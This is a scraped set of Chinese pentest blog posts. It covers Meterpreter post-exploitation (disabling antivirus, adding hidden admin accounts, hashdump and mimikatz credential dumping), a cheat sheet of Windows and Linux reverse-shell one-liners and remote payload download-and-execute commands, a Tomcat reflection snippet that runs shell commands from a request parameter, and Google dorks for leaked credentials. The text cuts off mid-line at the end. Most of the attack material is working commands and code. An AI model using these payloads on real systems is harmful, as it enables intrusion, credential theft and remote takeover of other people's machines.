0\n添加策略允许攻击机能够正向的去连接靶机的5555端口而不被拦截\n\n关闭杀毒软件\n关闭windefend：net stop windefend关闭杀毒软件：run killavrun post/windows/manage/killav\n\n打开并连接3389\n开启3389远程桌面:run post/windows/manage/enable_rdprun getgui -e 在目标机器添加用户:run getgui -u admin -p admin #meterpreter模块的功能,通过-u指定用户名,-p指定密码即可添加用户net localgroup administrators admin /add  #windows通过这个命令添加用户到管理员用户组 远程连接桌面rdesktop -u username -p password ip #Linuxmstsc.exe #Windows中的远程桌面\n原始目标机远程桌面服务开启情况\n\n运行指令，当前目标机处于关闭状态\n\n接下来向目标机器添加账户，注意密码需要符号规范（大小写，特殊字符，不少于8位）中途有报错但是通过net user可以看到账户已添加进去\n\n之后可以将其添加到管理员用户组\n利用net localgroup administrators可以查看到管理员用户组有哪些用户\n\n之前如果没有添加到管理员用户组时会出现本地策略不允许您使用交互式登录的情况，这里需要注意一下\n\n\n桌面截图查看\nscreenshot  # 会保存屏幕截图到/root下use espia   # 加载模块screengrab  # 和screenshot一样,但是会自动打开这个图片,个人感觉这个最好用screenshare # 会生成一个html文件并自动在浏览器打开,并且会不断时时更新跟视频差不多,但是默认保存到/root会有权限限制,复制一下到其他地方在访问即可,另外我打开之后画面完全没出来过,太卡了不建议使用\n\n\n删除指定用户\nuse post/windows/manage/delete_user set USERNAME admin2set session [sessionid]run\n可以通过search cmd来找到指定模块\n可以通过background保证不退出会话，同时执行其他模块\n\n接下来再去查看账户可以看到已经删除\n\n\n数据包抓取\n利用sniffer模块抓取目标机流量包\nload sniffersniffer_interfacessniffer_start 1sniffer_dump 1 1.cap\n这里可以看到实际就是对指定网卡进行流量捕获\n\n利用psnuffle模块进行流量包解码\nuse auxiliary/sniffer/psnuffleset PCAPFILE 1.capexploit\n\n\n口令破解\nhashdump可以获取到目标机的明文密码以及哈希值（高版本只能哈希值）\n其实际上读取的是系统当中的SAM文件中的内容，解析并提取其中的哈希值\n注意当前模块的使用需要拥有SYSTEM权限\nuse post/windows/gather/hashdumpset session exploite\n\n一点提权的知识\ngetuid可以查看到当前用户权限\n如果是普通用户想要使用hashdump功能则需要先去提权，msf自带一个getsystem功能，其是以一种命名管道的方式获取的SYSTEM权限，但实际上并未达到真正的SYSTEM权限\n\n另一种方式通过进程迁移的方式，将当前进程迁移到SYSTEM权限运行的进程上，可以达到真正提权的效果\n以vmtoolsd为例作进程迁移，该进程号为424\n\nmigrate 424\n\nhashdump结果的解读\n用户名:用户id:LM-HASH值:NT-HASH值\n创建的用户id从1000开始，内置及admin（500）是500开始\n\nmimikatz模块 hashdump使用的是mimikatz的部分功能\nload mimikatzwdigest kerberos msv ssp tspkg tspkg livesspmimikatz_command -hmimikatz_command -f a:: #查询有哪些模块mimikatz_command -f samdump::hashesmimikatz_command -f samdump::bootkey\n\n其他模块的使用\n确定目标主机是否为虚拟机\nrun checkvm\n获取目标主机上的软件安装信息\nrun post/windows/gather/enum_applications\n获取目标主机上最近访问过的文档、链接信息\nrun post/windows/gather/dumplinks\n查看目标环境信息\nrun post/multi/gather/env\n查看firefox中存储的账号密码\nrun post/multi/gather/firefox_creds\n查看ssh账号密码的密文信息，证书信息\nrun post/multi/gather/ssh_creds\n更多模块中的功能使用可以通过search gather查看\n\n建议使用的集成信息收集模块\nrun scraperrun winenum\n\n\nMSF主机发现\n模块位于路径 modules/auxiliary/scanner/discovery/\n主要有：\nmodules/auxiliary/scanner/discovery/arp_sweepmodules/auxiliary/scanner/discovery/ipv6_mulitcast_pingmodules/auxiliary/scanner/discovery/ipv6_neighbormodules/auxiliary/scanner/discovery/ipv6_neighbor_router_advertisementmodules/auxiliary/scanner/discovery/udp_probemodules/auxiliary/scanner/discovery/udp_sweep\n\nMSF端口扫描\n通过search portscan查看模块下的功能\nauxiliary/scanner/portscan/ftpbounce //通过FTP bounce攻击的原理对TCP服务进行枚举,一些新的FTP服务器软件能很好防范此攻击,单在旧的系统上仍可以被利用auxiliary/scanner/natpmp/natpmp_portscan //NAT-PMP External Port Scannerauxiliary/scanner/portscan/xmas //圣诞树扫描.属于较为隐秘的扫描方式,通过发送FIN,PSH,URG标志,能够躲避一些高级TCP标记检测器的过滤auxiliary/scanner/portscan/ack //通过ACK扫描方式对防火墙上未被屏蔽的断口进行探测auxiliary/scanner/portscan/tcp //通过一次完整TCP连接来判断端口是否开放,速度较慢auxiliary/scanner/portscan/syn //使用发送TCP SYN标志方式探测开放端口\n推荐使用SYN扫描\n\n服务扫描与查点\n确定开放端口之后，对相应端口进行服务探测\n模块位于Scanner下，工具命名方式以如下的方式\n[service_name]_version# 可用于遍历网络中包含了某种服务的主机，并进一步确定服务的版本[service_name]_login# 可对某种服务进行口令探测攻击\n查找相应的服务模块直接search _version/_login\n\n利用方式的话就是直接use指定之后show options查看选项设置对应的参数即可\n\n\n\n\n\n","tags":["内网渗透"]},{"title":"内网渗透——反弹Shell的各种姿势","url":"/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/","content":"反弹Shell正向shell\n控制端主动发起连接请求去连接被控制端，中网网络链路不存在阻碍\n适用场景：控制端与被控端之间是互通无阻的\n\n阻碍的来源一方面是受害机如果在内网当中，没有独立的公网ip导致无法访问；另一方面正向从公网连接会受到防火墙安全策略的限制\n正反shell的区分：\n\n\n谁是主动方(正向是攻击机,反向是受害机)\n受害机对哪种shell的监管检测更严格(正向)\n受害机在内网中攻击机就无法通过指定ip和端口正向申请shell\n\n\n\n\n反向Shell\n被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包\n\n\n\nWindows 反弹 Shell\nnc.exe\n\n正向Shell\n被控端：\nnc -lvvp 6666 -e cmd.exe     // -e shell环境重定向至6666端口\n控制端：\nnc 192.168.1.62 6666\n原理：\n被控端将cmd.exe重定向到本地的6666端口, 控制端主动连接受害机的6666端口, 即可获得shell\n\n反向shell\n控制端：\nnc -lvvp 6666\n被控端：\nnc -e cmd.exe 192.168.1.227 6666\n被控端将cmd.exe重定向到控制单的6666端口，控制单只需要监听本地的6666端口，即可获得shell\n\n\n\nRundll32.exe 与Windows操作系统相关\n它允许调用从DLL导出的函数（16位或32位），并将其存储在适当的内存库中\nhttps://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/rundll32\n通过Metasploit的SMB Delivery模块发起Rundll32攻击\nuse exploit/windows/smb/smb_deliveryset srvhost  msf服务ipset lhost smf服务ipset lport 4444exploite -j\n\n执行payload之后将下列payload在目标机中执行，这个攻击依赖于SMB服务，需要目标机开启才行\nrundll32.exe \\\\172.16.80.136\\AeEcdf\\test.dll,0\n我这儿不知道为啥一直显示无法加载指定模块\n\nRegsvr32.exe\nRegsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。\nRegsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\\System32文件夹中\n语法: Regsvr32.exe [/s] [/u] [/n] [/i[:cmdline]]\n/u - 注销服务器\n/i - 调用DllInstall传递一个可选的[cmdline]; 当它与/u一起使用是, 它调用dll来写在\n/n - 不要调用DLLRegisterServer; 此选项必须与/i一起使用\n/s - 沉默; 不显示消息框\n通过msf的web delivery模块启动Regsvr32\nuse exploit/multi/script/web_deliveryset srvhost msfipset lhost msfipset lport 6666set paylaod windows/meterpreter/reverse_tcpset target Regsvr32\n该模块默认为python编写的exp，我们要改为想要执行的对应脚本语言写的payload\n\n\n\n\nregsvr32 /s /n /u /i:http://172.16.80.136:8080/ExPIVc.sct scrobj.dll\n\nCertuil.exe\nCertuil.exe是作为证书服务的一部分安装的命令行程序, 我们可以用这个工具在计算机中执行恶意的exe文件以获得meterpreter会话\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.80.136 lport=1234 -f exe &gt; shell.exepython3 -m http.server 8000certutil.exe -urlcache -splite -f http://172.16.80.136/shell.exe shell.exe &amp; shell.execertutil.exe -urlcache -splite -f http://172.16.80.136:8000/shell.exe shell.exe delete\n这里的利用就是通过certutil.exe下载指定ip中的恶意shell文件并执行，执行完后清除\n\n\n\n这台xp虚拟机太老，装软件服务也卡。。。下次还是得上靶机\n\n\nPowershell.exe\n通过PowerShell发动Powercat攻击\n这个PoweCat需要有免杀能力\n攻击方先下载并启动一个服务器\ngit clone https:/github.com/besimorhino/powercat.git python3 -m http.server 8000\n之后监听端口等待接收反弹shell\nnc -lvvp 6666\n靶机执行\npowershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.92.128:8000/powercat.ps1&#x27;);powercat -c 192.168.92.128 -p 6666 -e cmd&quot;\n\nMsiexec.exe\nWindows OS 安装有一个Windows安装引擎，MSI包使用msiexe.exe来解释安装\n首先使用msf生成恶意的msi文件，并放到服务器上\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.92.128 lport=6666 -f msi &gt; shell.msi python3 -m http.server 8000\n接着受害机执行msiexe下载指定恶意文件，触发反弹shell\nmsiexec.exe /q /i http://ip/shell.msi\n\nMetasploit.exe\n依然是通过msf生成一个恶意exe\n\n参数总结：\n-p Payload to use. Specify ‘-‘ or STDIN for custom\nLHOST 接收反弹shell的ip\nLPORT 接收反弹shell的端口\n-f Output format\n\n\nLinux 反弹 shell\nNC正向Shell\n与Windows是一样的，不同点就是shell执行环境这里是bash\n通常情况下被控端：\nnc -lvvp 6666 -e /bin/sh\n控制端\nnc ip 6666\n但是在某些版本的nc处于安全考虑是没有-e参数的，这种情况下如何利用呢？\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.92.128 6666 &gt; /tmp/f\n\n 原理：mkfifo命令首先创建了一个管道，cat将管道里面的内容输出传递给/bin/sh，-i创建一个shell环境，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc传到该管道，由此形成了一个回路\n/tmp/f 管道 =&gt; sh =&gt; nc =&gt; /tmp/f\n\n另一种方式为\nmknod backpipe p; nc ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe\nmknod 创建字符设备文件和块设备文件\nbackpipe将其中的输入重定向到nc的标准输入当中，并将结果输出通过管道传给bash环境并执行，标准输出和错误输出结果再回传给backpipe\n\nBash\n被控端：\nbash -i &amp;&gt;/dev/tcp/ip/port &lt;&amp;1\n原理：\n\n首先bash -i &gt; /dev/tcp/ip/port将被控端交互式shell的输出结果重定向到控制端，接着控制端bash -i &lt; /deb/tcp/ip/port 将控制端的输出重定向到被控端的bash环境中执行。最后将其整合在一起，我们需要的是被控端的bash执行，控制端能输入和显示输出\n\n不适用bash的方式\n exec 5&lt;&gt;/dev/tcp/ip/6666,cat&lt;&amp;5 | while read line; do $line 2&gt;&amp;5&gt;&amp;5;done\n&lt;&gt;表示可读可写，这里也就是先建立一个tcp通过并重定向至5，将5中的内容输出给while循环，循环依次接收数据并执行，最终再将输出重定向回tcp通道\n\nTelnet\n攻击机：\nnc -lvvp 6666\n目标机：\nrm -f a &amp;&amp; mknod a p &amp;&amp; telnet ip 6666 0&lt;a | /bin/bash 1&gt;a rm -f a;mknod a p;telnet 192.168.92.128 6666 0&lt;a | /bin/bash 1&gt;a\n\nOpenssl\nopenssl反弹443端口，厂商一般都有流量监控设备，直接明文传输会被审查到\n\n在靶机上生成密钥文件\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n在远程攻击机上启动监视器\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 443\n\n在目标机上反弹shell\nmkfifo /tmp/s;/bin/sh -i &lt; /tmp/s 2&gt;&amp;1 |openssl s_client -quiet -connect ip:6666 &gt; /tmp/s;rm /tmp/s\n\n\n\n\n","tags":["内网渗透"]},{"title":"初识回显","url":"/2023/01/22/%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/","content":"回显技术学习写在前面通常我们在进行命令执行，文件读取等情况，需要查看命令执行的结果的时候，可能会出现无法查看返回结果的情况，这里学习一下几种通用的回显技术，并集成到工具当中。\n通用回显技术\n报错回显\n这种回显基于报错信息来进行回显，基本原理就是在 throw new Exception() 抛出异常时将回显信息返回，如果服务端并没有对报错信息作处理的话就能够直接回显出来\n\n\nOOB 带外回显\n\n\n\n对于出网机器\n使用http传输，如wget，curl，certutil将回显信息爬出\n\n对于不出网机器\n使用DNS传输，ICMP传输，powershell中的wget，curl等传输\nString target = &quot;xxxxx&quot;;        BASE64Encoder encoder = new BASE64Encoder();        String encodeResult = encoder.encode(this.result.getBytes());        URL url = new URL(target);        String body = &quot;&#123;\\&quot;result\\&quot;:\\&quot;&quot; + encodeResult + &quot;\\&quot;&#125;&quot;;        HttpURLConnection connection = (HttpURLConnection) url.openConnection();        connection.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json&quot;);        connection.setDoOutput(true);        connection.setRequestProperty(&quot;Content-Length&quot;, String.valueOf(body.length()));        connection.setConnectTimeout(2000);        connection.setReadTimeout(5000);        connection.getOutputStream().write(body.getBytes());        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8));        in.close();        connection.disconnect();\n\n\n\n\n\nTomcat型回显\n我们的需求就是能够找到一个通用的 Response类实例，然后直接写入回显内容\n进而需要找到如下条件的变量实例：\n\n是一个ThreadLocal，这样才能获取到当前线程的请求信息。而且最好是一个static静态变量，否则我们还需要去获取那个变量所在的实例\n\n在 org.apache.catalina.core.ApplicationFilterChain#internalDoFilter()和静态代码块中可以看到初始化了一个当前线程并设置了request 和 response\n\n我们需要做的就是将WRAP_SAME_OBJECT变量设置为true，然后从 lastServicedResponse 中取 response 变量即可。注意到 WRAP_SAME_OBJECT 变量为final字段，所以我们想要通过反射修改的话需要一些特殊操作\n\n\n将 private 修饰的字段变为 accessible；再将 final 修饰符去掉；\n\nstatic void changeStaticFinal(Field field, Object newValue) throws Exception &#123;       field.setAccessible(true); // 如果field为private,则需要使用该方法使其可被访问         Field modifersField = Field.class.getDeclaredField(&quot;modifiers&quot;);       modifersField.setAccessible(true);       // 把指定的field中的final修饰符去掉       modifersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);         field.set(null, newValue); // 为指定field设置新值   &#125;\n\n\nField WRAP_SAME_OBJECT_FIELD = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedResponse&quot;);Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;);modifiersField.setAccessible(true);//去掉final修饰符modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);//设置允许访问WRAP_SAME_OBJECT_FIELD.setAccessible(true);lastServicedRequestField.setAccessible(true);lastServicedResponseField.setAccessible(true);ThreadLocal&lt;ServletResponse&gt; lastServicedResponse =    (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(null);ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(null);boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);String cmd = lastServicedRequest != null    ? lastServicedRequest.get().getParameter(&quot;cmd&quot;)    : null;if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) &#123;    //如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果    lastServicedRequestField.set(null, new ThreadLocal&lt;&gt;());    lastServicedResponseField.set(null, new ThreadLocal&lt;&gt;());    WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);&#125; else if (cmd != null) &#123;    ServletResponse responseFacade = lastServicedResponse.get();    responseFacade.getWriter();    java.io.Writer w = responseFacade.getWriter();    Field responseField = ResponseFacade.class.getDeclaredField(&quot;response&quot;);    responseField.setAccessible(true);    //目前得到的response是org.apache.catalina.connector.ResponseFacade，其封装了org.apache.catalina.connector.Response，要修改的usingWriter字段在后者中    Response response = (Response) responseField.get(responseFacade);    Field usingWriter = Response.class.getDeclaredField(&quot;usingWriter&quot;);    usingWriter.setAccessible(true);    usingWriter.set((Object) response, Boolean.FALSE);    boolean isLinux = true;    String osTyp = System.getProperty(&quot;os.name&quot;);    if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;        isLinux = false;    &#125;    String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, cmd&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();    Scanner s = new Scanner(in).useDelimiter(&quot;\\\\a&quot;);    String output = s.hasNext() ? s.next() : &quot;&quot;;    w.write(output);    w.flush();&#125;\n这里有个细节就是字段 usingWriter 的作用，实际上是为了解决网页不会输出原来正常内容的问题，writer的占用将会导致原先的response得不到输出，从而在原有业务逻辑中抛出异常\n验证的时候需要刷新两次的原因是因为第一次只是通过反射去修改值，这样在之后的运行中就会cache我们的请求，从而也就能获取到response。\n\nweblogic 型回显\n原理和上面一样，也是筛选出可以调用req 和 rep内容的线程，对其回显内容进行改造，weblogic 中的 ServletRequestImpl 类符合条件\n\n((ServletRequestImpl) this.getCurrentWork()).getResponse().getWriter().write(&quot;xxxxxxx&quot;)，就会在返回包中看到返回xxxxxxx\n\n按照字节流进行输出，如下调用方式：(weblogic10.3.6)\n((ServletRequestImpl) this.getCurrentWork()).getResponse().getServletOutputStream().writeStream(new StringInputStream(&quot;xxxx&quot;))((ServletRequestImpl) this.getCurrentWork()).getResponse().getServletOutputStream().flush()\n同时，为了避免其他输出信息的干扰，如下方式可以将结果覆盖为空\n((ServletRequestImpl) this.getCurrentWork()).getResponse().getWriter().write(&quot;&quot;)\n结合一下，利用反射构造的结果如下\nClass&lt;?&gt; clazz = Class.forName(&quot;weblogic.work.ExecuteThread&quot;);        Method m = clazz.getDeclaredMethod(&quot;getCurrentWork&quot;);        Object currentWork = m.invoke(Thread.currentThread());        Class&lt;?&gt; servletRequestImpl = Class.forName(&quot;weblogic.servlet.internal.ServletRequestImpl&quot;);        Method m2 = servletRequestImpl.getDeclaredMethod(&quot;getResponse&quot;);        Object response = m2.invoke(currentWork);        Class&lt;?&gt; servletResponseImpl = Class.forName(&quot;weblogic.servlet.internal.ServletResponseImpl&quot;);        Method m3 = servletResponseImpl.getDeclaredMethod(&quot;getServletOutputStream&quot;);        Object outputStream = m3.invoke(response);        Class&lt;?&gt; stringInputStream = Class.forName(&quot;weblogic.xml.util.StringInputStream&quot;);        Constructor&lt;?&gt; constructor = stringInputStream.getDeclaredConstructor(String.class);        Object resultStream = constructor.newInstance(this.result);        Class&lt;?&gt; servletOutputStreamImpl = Class.forName(&quot;weblogic.servlet.internal.ServletOutputStreamImpl&quot;);        Method m4 = servletOutputStreamImpl.getDeclaredMethod(&quot;writeStream&quot;, stringInputStream);        m4.invoke(outputStream, resultStream);        Method m5 = servletOutputStreamImpl.getDeclaredMethod(&quot;flush&quot;);        m5.invoke(outputStream);        Method m6 = servletResponseImpl.getDeclaredMethod(&quot;getWriter&quot;);        Object writer = m6.invoke(response);        Class&lt;?&gt; printWriter = Class.forName(&quot;java.io.PrintWriter&quot;);        Method m7 = printWriter.getDeclaredMethod(&quot;write&quot;, String.class);        m7.invoke(writer, &quot;&quot;);\nTODO：待深入\n\n\n参考链接https://cloud.tencent.com/developer/article/1956480\nhttps://xz.aliyun.com/t/7348\nhttps://www.jianshu.com/p/2d490b0155ad\nhttps://l3yx.github.io/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/#%E5%9F%BA%E4%BA%8E%E5%85%A8%E5%B1%80%E5%82%A8%E5%AD%98%E8%8E%B7%E5%8F%96Tomcat-Response\n","tags":["JAVA安全"]},{"title":"渗透的艺术——信息收集—-善用搜索引擎","url":"/2023/01/12/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%9A%84%E5%AD%A6%E4%B9%A0/","content":"写在前面渗透信息收集当中最关键的一步是利用好搜索引擎来获取敏感的信息，为后续账号弱口令和字典的制作提供参考，得好好学学\n网络空间测绘溯源技术\n行为测绘\n\n 不同的群体，可能表现出基本的独有的特征，当我们能掌握到这个特征，那么我们就能尽可能识别出这个群体里的所有个体，而这些所谓的行为特征在网络空间测绘里表现出的是这个设备各个端口协议里的banner特征\n\n\n\n在这些自定义过程中不同的群体又可能表现出不一样的独有特征，我们利用这些行为特征进行网络空间测绘，这就是所谓的“行为测绘”\n这里的独有特征一般指的是 banner信息，例如前端代码，服务连接交互信息、SSL证书信息\n\n动态测绘\n\n 对于动态测绘的概念，简单理解就是数据订阅\n\n这里可以通过指纹语句订阅或者IP订阅，周期性对某个资产面进行扫描，从而使我们能够动态掌握周期内新增资产的情况\n\n交叉测绘\n\nIPv4 与 IPv6的 “交叉”\n\nIPV6在逐渐普及，但是之所以在交叉测绘这里提及IPV6，就是因为，与我们密切相关的安全层面，往往出现在IPV4及IPV6的配置错误上，例如企业在部署安全措施时，对其IPV4打满了防护，但是IPV6却是白板，那么这时如果攻击者通过IPV6进行攻击，那么无疑是一马平川的，这也是很多企业在进行安全管理中没有想到的问题\n\n\nFofa的简单使用\n逻辑运算符\n&amp;&amp; ：表示逻辑与|| ：表示逻辑或\n\n查找指定应用的IP\napp=&quot;xxx&quot;\n\n查找使用指定协议的IP\nprotocol=&quot;xxx&quot;\n\n查找开放端口的IP\nport=&quot;3389&quot;ports=&quot;1433,3306,3389&quot;\n\n查找IP或网段的信息\n#查找指定ip的信息ip=&quot;220.181.38.148&quot;   #查找指定网段的信息ip=&quot;220.181.38.0/24&quot;\n\n查找使用指定css或js的网站\n找到这个框架特有的css或js文件，然后将该css或js的路径复制粘贴到 Fofa进行查找\n\n其他\n#查找title含有管理后台的iptitle=&quot;管理后台&quot;     #查找响应头含有thinkphp的ipheader=&quot;thinkphp&quot;   #查找响应包含有thinkphp的ipbody=&quot;管理后台&quot;      #查找指定根域的所有子域domain=&quot;baidu.com&quot;  #查找域名中带有指定词的ip 从 url 中搜索&quot;test&quot;,注意搜索要用host作为名称host=&quot;test&quot;         #查找中国境内的ip，主要结合其他语句一起 搜索指定国家(编码)的资产country=CN city=&quot;Beijing&quot;      # 搜索指定城市的资产.例: 搜索指定城市的资产.region=&quot;Zhejiang&quot;   # 搜索指定行政区的资产.例: 搜索指定行政区的资产#搜索证书(如https证书、imaps证书等)中含有&quot;phpinfo.me&quot;关键词的网站和IPcert=&quot;phpinfo.me&quot; # 搜索使用此icon的资产icon_hash=&quot;-xxxx&quot;\n\n\n如何扩大资产搜索范围？\n搜索的时候拆分title来搜索可以获得更多的搜索结果和更大的搜索范围，但是可能会带来脏数据，需要我们人工辨别是否为目标所属资产\ntitle=&quot;XX市XX医院&quot; =&gt; title=&quot;XX市&quot; &amp;&amp; title=&quot;XX医院&quot;\nAPI接口的特殊姿势\n可以得到\n1. IP资产2. 关联相关IP段3. 端口扫描\n证书的特殊姿势\n可以得到很多关联域名\nGoogle Hack\nGoogle使用技巧总结\n\n使用正确的谷歌地址\n针对不同国家资源关联性，可以在其后加上国家的后缀，例如\ngoogle.co.uk 英国google.fr 法国google.co.in 印度\n\n轻松知道一个单词的意思\ndefine: xxx\n\n\n\n基础法则\n\n\nGoogle 不区分大小写，除了 or 被用作布尔运算符时，就必须写做OR。\nGoogle 通配符（*），不同于在其他任何语言中的使用，星号在一个搜索短语中仅仅表示一个单词。\nGoogle 保留忽略的权利，where、how以及一些通用的单词、字母和单个数字，会被Google默认忽略。\nGoogle限制最多搜索32个单词，包含搜索项和高级运算符。不过也有一些其他方法绕过这种限制，比如使用通配符来代替某些搜索项。\n\n\n\n基础查询\n\n最简单的就是直接包含一个单词或者单词组合\n“word1 word2” 会严格按照你给定的顺序对短语中的所有单词进行搜索\n支持布尔运算符（大写）和特殊字符查询\n+强制包含跟着它的单词\n-把一个单词排除出一个搜索之外\n| 可以指示Google 在查询时落在其中一个或另一个查询上\n\n\n\n\n高级运算符\n| 高级运算符 | 特性/要点                                                    || :————: | :—————————————————————————————- ||  intitle   | 在页面的标题里查找字符串 与其他运算符混合使用效果佳          || allintitle | 在一个页面的标题里查找所有搜索项 与其他运算符或搜索项混合使用效果差 ||   inurl    | 在一个页面的URL里查找字符串 与其他运算符混合使用效果佳 （有时 site 和 filetype 做的比 inurl 好） ||  allinurl  | 在一个页面的URL里查找所有搜索项 与其他运算符或搜索项混合使用效果差 ||  filetype  | 基于文件扩展名搜索特殊类型文件 需要一个额外搜索项 其他运算符或搜索项混合使用效果差 || allintext  | 别用它                                                       ||    site    | 把一个搜索限定在一个特别的网站或域中 与其他运算符混合使用效果佳 能够单独使用 ||    link    | 搜索一个网站的链接或者URL 无法与其他运算符或搜索项混合使用 可以扩展成包含目录名、文件名、参数等内容的完整URL ||  inanchor  | 在链接的描述性文字中查找文本 其他运算符或搜索项混合使用效果佳 用作寻找网站之间的关系 || daterange  | 寻找在一个特定日期范围内索引过的页面 需要一个搜索项 与其他运算符或搜索项混合使用效果佳 可以被as_qdr淘汰 ||  numrange  | 在特定范围内查找一个数字 与其他运算符或搜索项混合使用效果佳 需要两个参数，可以简写 ||   cache    | 显示Google缓存的页面拷贝 无法与其他运算符或搜索项混合使用 有很多妙用，但结果优点不可预测 ||    info    | 显示关于一个页面的总结信息 无法与其他运算符或搜索项混合使用 直接搜网站名或URL会得到相同的结果 ||  related   | 显示与所给网站或URL相关的站点 无法与其他运算符或搜索项混合使用 ||   stocks   | 为一个股票代码显示Yahoo财经的股票列表 无法与其他运算符或搜索项混合使用 与本次课题无关 ||   define   | 显示单词或短语的各种不同含义 无法与其他运算符或搜索项混合使用 与本次课题无关 |\n样例网站：https://pentest-tools.com/information-gathering/google-hacking#use-cases\n\n信息收集\n\n基础信息收集\n子域名查询 利用*来进行泛查询\nsite:*.example.com -www.example.com\nC段查询\nsite:18.18.18.*\n\n敏感文件收集\n备份文件\n\nsite:example.com filetype:zip\nsite:example.com filetype:rar\nsite:example.com filetype:tar\nsite:example.com filetype:tar.gz\nsite:example.com filetype:7z\nsite:example.com filetype:cab\nsite:example.com filetype:gz\nsite:example.com filetype:iso\nsite:example.com filetype:bz2\nsite:example.com filetype:jar\n\n常见单页备份文件扩展名 bkf、bkp、bak、old、backup\n配置文件\n为了避免搜到一些模板配置文件或者默认配置文件，增加一些限定：\n1. 过滤掉单词 sample example test how to tutorial2. -cvs 过滤掉CVS库site:example.com filetype:cnf my.cnf -cvs -examplesite:example.com inurl:config &quot;fetch =+refs/heads/*:refs/remotes/origin/*&quot;site:example.com inurl:configuration.php intext:&quot;class JConfig &#123;&quot;\n日志文件\n通常以log结尾\nsite:example.com filetype:log inurl:logsite:example.com ext:log log\n数据库文件\n结尾如: sql dbf mdb wdb\n对于二进制格式的文件，google不能理解，因此这里用inurl而不是filetype\nsite:example.com inurl:db|backupdb...数据库转储：site:example.com intext:&quot;Dumping data for table&quot;\n样例文件\n\nweb服务器软件经常会在 web 目录里存有手册和文档一起提供给用户，这些文件告诉用户如何进行使用或理解。这些文件将会带来一些安全风险\n\n例如一些vpn软件手册中可能会存在默认密码\nsite:example.com intitle:&quot;apache tomcat/&quot; &quot;Apache Tomcat examples&quot;site:example.com inurl:/examples/jsp/snp/snoop.jsp\n其他敏感文件\n以robots.txt为例\nsite:example.com inurl:&quot;robot.txt&quot; intext:disallow filetype:txt\n注册表\nsite:example.com filetype: reg HKEY_CURRENT_USER username\n\n敏感目录收集\n目录遍历的位置\nsite:example.com intitle:index .of &quot;parent directory&quot;site:example.com intitle:index .of name size\n查看指定目录的遍历\nsite:example.com intitle:index .of inurl:admin\n查找服务器软件名、版本号、操作系统相关信息，还是从intitle入手\nsite:example.com intitle:index .of &quot;Application Data/Microsoft/Credentials&quot;site:example.com intitle:index .of etc|.sh_history|.bash_history|passwd|people.lst|htpasswd|...\n临时文件目录\nsite:example.com inurl:tmp|temp|cache...\n登录位置查询\n# 利用 intextsite:example.com intext:管理|后台|登陆|用户名|密码|帐号|注册|admin|login|manage|manager|register|houtai|guanli|forgotten# 利用 inurlsite:example.com inurl:admin|login|manage|manager|register|prelogin|logincheck# 利用版权信息、指纹信息site:example.com intext:&quot;Powered by&quot;site:example.com intext:&quot;XX科技&quot;\n\n敏感信息收集\n收集错误消息\nsite:example.com intext:&quot;sql syntax near&quot;|&quot;syntax error has occurred&quot;| &quot;incorrect syntax near&quot;|&quot;unexpected end of SQL command&quot;|&quot;mysql_connect()&quot;| &quot;mysql_query()&quot;|&quot;Warning: pg_connect()&quot;# 另一种间接搜索方式，即通过错误消息泄露出来的如服务器敏感路径来间接查找报错位置site:example.com intext:&quot;/var/lib/&quot;|&quot;/var/www/&quot;|&quot;D:\\&quot;|&quot;C:\\&quot;\n用户名、密码和其他秘密信息\nsite:example.com intext:(password|passcode|pass|密码) intext:(username|userid|user|用户|账户)\n更多情况出现在网站提供的doc操作手册当中\n电子邮箱地址查找\nsite:example.com intext:邮箱|邮件|email|e-mailsite:example.com intext:&quot;@qq.com&quot;|&quot;@163.com&quot;...\n电话号码\nsite:example.com 